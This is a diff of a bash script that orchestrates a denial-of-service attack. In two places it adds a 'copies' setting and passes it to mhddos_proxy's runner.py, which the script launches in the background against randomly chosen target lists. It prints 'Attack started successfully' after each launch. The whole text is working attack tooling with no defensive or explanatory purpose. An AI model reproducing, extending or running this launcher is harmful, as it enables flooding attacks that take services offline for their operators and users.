@@ -183,8 +183,10 @@ do
 		if ((num_of_copies > list_size));
 		then 
 			random_numbers=$(shuf -i 1-$list_size -n $list_size)
+			copies=$num_of_copies
 		else
 			random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
+			copies=1
 		fi
 	
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
@@ -203,7 +205,7 @@ do
             		echo "python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug"
             
             		cd ~/mhddos_proxy
-            		AUTO_MH=1 python3 runner.py $cmd_line -t $threads --vpn $debug&
+            		AUTO_MH=1 python3 runner.py $cmd_line -t $threads --copies $copies --vpn $debug&
 	    		sleep 20s
             		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    		done
@@ -220,8 +222,10 @@ do
 		if ((num_of_copies > list_size));
 		then 
 			random_numbers=$(shuf -i 1-$list_size -n $list_size)
+			copies=$num_of_copies
 		else
 			random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
+			copies=1
 		fi
 	
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
@@ -239,7 +243,7 @@ do
             		echo "python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug"
             
             		cd ~/mhddos_proxy
-            		AUTO_MH=1 python3 runner.py $cmd_line -t $threads --vpn $debug&
+            		AUTO_MH=1 python3 runner.py $cmd_line -t $threads --copies $copies --vpn $debug&
 	    		sleep 20s
 			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
 			
